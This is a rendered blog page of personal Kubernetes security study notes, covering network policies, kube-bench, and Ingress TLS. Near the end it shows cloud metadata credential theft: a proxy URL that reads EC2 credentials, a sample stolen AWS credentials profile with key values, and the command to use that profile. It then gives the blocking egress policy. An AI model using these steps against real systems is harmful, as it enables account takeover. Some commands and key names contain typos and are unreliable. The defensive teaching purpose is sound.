+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl exec other -it -- /bin/sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# wget --spider --timeout=1 10.0.0.43:3000 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.0.0.43:3000 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.0.0.43:3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget: download timed out
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we&amp;rsquo;ll use the namespace label (orion) and pod label (frontend), and port 3000, and add them to the policy to be the only one who could talk to backend:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend-ingress&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;g04&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;podSelector&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;matchLabels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;backend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;policyTypes&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;Ingress&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ingress&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;namespaceSelector&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;matchLabels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;orion&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;podSelector&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;matchLabels&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;tier&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;frontend&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;protocol&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;TCP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;port&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is how the network policy look like now:
+Frontend &amp;ndash;&amp;gt; Backend , Port: 3000 ✅ Allow
+Other &amp;ndash;&amp;gt; Backend ❌ Deny&lt;/p&gt;
+&lt;h2 id=&#34;run-cis-benchmark-to-identify-security-risks-for-cluster-components&#34;&gt;Run CIS Benchmark to identify security risks for cluster components&lt;/h2&gt;
+&lt;p&gt;To run CIS benchmark on Control Plane:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-master.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 230627.png]]&lt;/p&gt;
+&lt;p&gt;Upon Job execution, the corresponding Pod running the verification process can be identified by its name in the default namespace. The Pod’s name starts with the prefix kube-bench, then appended with the type of the node plus a hash at the end.&lt;/p&gt;
+&lt;p&gt;Wait until the Pod transitions into the “Completed” status to ensure that all verifica‐ tion checks have finished. You can have a look at the benchmark result by dumping the logs of the Pod. A more convenient way would be to redirect logs to a file.&lt;/p&gt;
+&lt;p&gt;To see pods in a different POV:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;minikube ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker ps
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;creating-an-ingress-with-tls-termination&#34;&gt;Creating an Ingress with TLS Termination&lt;/h2&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 132607.png]]&lt;/p&gt;
+&lt;p&gt;It’s important to point out that the communication typically uses unencrypted HTTP network communication as soon as it passes the Ingress.&lt;/p&gt;
+&lt;p&gt;Configuring the Ingress for HTTPS communication relieves you from having to deal with securing the network communication on the Service level. In this section, we will learn how to create a TLS certificate and key, how to feed the certificate and key to a TLS-typed Secret object, and how to configure an Ingress object so that it supports HTTPS communication&lt;/p&gt;
+&lt;h3 id=&#34;deploy-service-and-pods&#34;&gt;Deploy service and pods&lt;/h3&gt;
+&lt;p&gt;In the context of an Ingress, a backend is the combination of Service name and port. Before creating the Ingress, we’ll take care of the Service, a Deployment, and the Pods running nginx so we can later on demonstrate the routing of HTTPS traffic to an actual application. All of those objects are supposed to exist in the namespace t75. &lt;code&gt;t75.yml&lt;/code&gt; defines all of those resources as a means to quickly create the Ingress backend.&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 115911.png]]&lt;/p&gt;
+&lt;p&gt;This command runs a one-off Pod named &lt;code&gt;tmp&lt;/code&gt; with the &lt;code&gt;busybox&lt;/code&gt; image. It does not automatically restart if the container exits and will be deleted after the command completes. Inside this Pod, it executes &lt;code&gt;wget&lt;/code&gt; to attempt a connection to the IP address &lt;code&gt;10.107.8.33&lt;/code&gt; on port &lt;code&gt;80&lt;/code&gt;, which is useful for testing network connectivity or checking if a web server is reachable from within the cluster.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl run tmp --image&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;busybox --restart&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Never -it --rm -- wget 10.107.8.33:80
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.107.8.33:80 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.107.8.33:80&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;saving to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;index.html           100% |********************************|   &lt;span style=&#34;color:#ae81ff&#34;&gt;612&lt;/span&gt;  0:00:00 ETA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt; saved
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pod &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tmp&amp;#34;&lt;/span&gt; deleted
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;create-tls-certificate-and-key&#34;&gt;Create TLS Certificate and Key&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$env:OPENSSL_CONF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Program Files\Git\usr\ssl\openssl.cnf
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -nodes -new -x509 -keyout accounting.key -out accounting.crt -subj &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/CN=accounting.tls&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This command generates a new self-signed TLS certificate and private key without encrypting the key. The certificate will have the Common Name (CN) set to &lt;code&gt;accounting.tls&lt;/code&gt;, and the files will be saved as &lt;code&gt;accounting.key&lt;/code&gt; and &lt;code&gt;accounting.crt&lt;/code&gt;, respectively.&lt;/p&gt;
+&lt;p&gt;Here’s what each file is used for:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;accounting.key&lt;/code&gt;&lt;/strong&gt;: The private key used to sign the certificate.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;accounting.crt&lt;/code&gt;&lt;/strong&gt;: The self-signed certificate that can be used for SSL/TLS connections.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For use in production environments, you’d generate a key file and use it to obtain a TLS certificate from a certificate authority (CA). For more information on creating a TLS certification and key.&lt;/p&gt;
+&lt;h3 id=&#34;creating-the-tls-typed-secret&#34;&gt;Creating the TLS-Typed Secret:&lt;/h3&gt;
+&lt;p&gt;using kubectl will automatically base64 encode the tls certificate accounting.crt.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create secret tls accounting-secret --cert&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;accounting.crt key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;accounting.key -n t75
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or you can manually base64 encode it then put it on a yaml then apply the tls secret.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;Secret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;accounting-secret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;t75&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes.io/tls&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;tls.crt&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk...&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# (Truncated base64-encoded certificate data)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;tls.key&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;LS0tLS1CRUdJTiBQUklWVRFIEtFWS0tLS0tCk...&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# (Truncated base64-encoded private key data)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This command will create a Kubernetes Secret named &lt;code&gt;accounting-secret&lt;/code&gt; in the &lt;code&gt;t75&lt;/code&gt; namespace. The Secret will contain the TLS certificate and private key that you generated earlier. This Secret can be used by Kubernetes resources like Ingress controllers or Pods to secure communications using SSL/TLS.&lt;/p&gt;
+&lt;h3 id=&#34;create-ingress&#34;&gt;Create Ingress:&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-info&#34; data-lang=&#34;ad-info&#34;&gt;*Ingress*, *LoadBalancer*, and *NodePort* are all ways of exposing services within your K8S cluster for external consumption.
+
+An ingress controller acts as a reverse proxy and load balancer inside the Kubernetes cluster. It provides an entry point for external traffic based on the defined Ingress rules. Without the Ingress Controller, Ingress resources won’t work.
+
+The Ingress Controller doesn’t run automatically with a Kubernetes cluster, so you will need to configure your own. An ingress controller is typically a reverse web proxy server implementation in the cluster.
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f accounting-ingress.yml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 120222.png]]&lt;/p&gt;
+&lt;p&gt;or with kubectl:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create ingress accounting-ingress &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;--rule&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accounting.internal.acme.com/*=accounting-service:80, \ tls=accounting-secret&amp;#34;&lt;/span&gt; -n t75
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the port 443 is listed in the “PORT” column, indicating that TLS termination has been enabled.&lt;/p&gt;
+&lt;p&gt;Creating an ingress object with no ingress controller in place will result in the following outpout:&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 123006.png]]&lt;/p&gt;
+&lt;p&gt;your ingress object will not get an ip address.&lt;/p&gt;
+&lt;p&gt;so we first need to create an ingress controller which will be type: LoadBalancer, then the ingress object will get an ip from this LB.&lt;/p&gt;
+&lt;p&gt;to install the ingress controller:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.3.0/deploy/static/provider/cloud/deploy.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get service ingress-nginx-controller --namespace&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ingress-nginx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 123146.png]]&lt;/p&gt;
+&lt;p&gt;Now your ingress object will get an ip:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get ingress accounting-ingress -n t75 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NAME                 CLASS   HOSTS                          ADDRESS         PORTS     AGE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;accounting-ingress   nginx   accounting.internal.acme.com   10.102.150.36   80, &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;   10m
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or for more details on the ingress object, use describe:&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 123415.png]]&lt;/p&gt;
+&lt;p&gt;add this line to your hosts file, for windows it&amp;rsquo;s on &lt;code&gt;C:\Windows\system32\drivers\etc\hosts&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;10.102.150.36 accounting.internal.acme.com 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 124233.png]]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Encryption Provided by TLS:&lt;/strong&gt; The TLS configuration in the Ingress resource only encrypts traffic from external clients to the Ingress controller.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Internal Communication (Service to Pod):&lt;/strong&gt; Within the Kubernetes cluster, communication between services and pods remains unencrypted unless additional measures are taken.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;securing-internal-communication-pod-to-pod&#34;&gt;Securing Internal Communication (Pod-To-Pod):&lt;/h4&gt;
+&lt;p&gt;If you need to encrypt internal traffic between services and pods (e.g., for sensitive data or compliance reasons), consider the following options:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;mTLS (Mutual TLS):&lt;/strong&gt; Implement mTLS using tools like Istio or Linkerd to encrypt traffic within the cluster.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Service Mesh:&lt;/strong&gt; Deploy a service mesh like Istio to manage and enforce encryption policies for inter-service communication.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Pod-Level TLS:&lt;/strong&gt; Implement TLS directly in the applications running in your pods.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;protecting-node-metadata-and-endpoints&#34;&gt;Protecting Node Metadata and Endpoints&lt;/h2&gt;
+&lt;p&gt;Kubernetes clusters expose ports used to communicate with cluster components. For example, the API server uses the port 6443 by default to enable clients like kubectl to talk to it when executing commands.&lt;/p&gt;
+&lt;p&gt;Inbound control plane node ports:&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 135818.png]]&lt;/p&gt;
+&lt;p&gt;Many of those ports are configurable. For example, you can modify the API server port by providing a different value with the flag &amp;ndash;secure-port in the configuration file &lt;code&gt;/etc/kubernetes/manifests/kube-apiserver.yaml&lt;/code&gt;, as documented for the cluster component. For all other cluster components, please refer to their corresponding documentation.&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 135919.png]]&lt;/p&gt;
+&lt;p&gt;To secure the ports used by cluster components, set up firewall rules to minimize the attack surface area. For example, you could decide not to expose the API server to anyone outside of the intranet. Clients using kubectl would only be able to run commands against the Kubernetes cluster if logged into the VPN, making the cluster less vulnerable to attacks.&lt;/p&gt;
+&lt;p&gt;Cloud provider Kubernetes clusters (e.g., on AWS, Azure, or Google Cloud) expose so-called metadata services. Metadata services are APIs that can provide sensitive data like an authentication token for consumption from VMs or Pods without any additional authorization&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 140112.png]]&lt;/p&gt;
+&lt;p&gt;For example, In AWS, the metadata server can be reached with the IP address 169.254.169.254.&lt;/p&gt;
+&lt;p&gt;This link for example is the metadata endpoint of an Ec2 Instance in aws &lt;a href=&#34;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&#34;&gt;http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This is how content would look like:&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 224321.png]]&lt;/p&gt;
+&lt;p&gt;The attacker would then simply create a profile file under  &lt;code&gt;~/.aws/credentials/exploited-endpoint&lt;/code&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[exploited-endpoint]
+aws_acces_key_id=ASIA6GG7PSQG6BYGNVKC
+aws_secret_key_access=Hm2Bcnbgjy+fUUhnLRejnKGTl8AcoIDrNP/HZjfY
+aws_session_token=IQoJb3JpZ2luX....
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;then run the following line to use this user when using aws cli to interact with the target.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export AWS_PROFILE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exploited-endpoint
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To prevent any Pod in a namespace from reaching the IP address of the metadata server, set up a network policy that allows egress traffic to all IP addresses except 169.254.169.254.&lt;/p&gt;
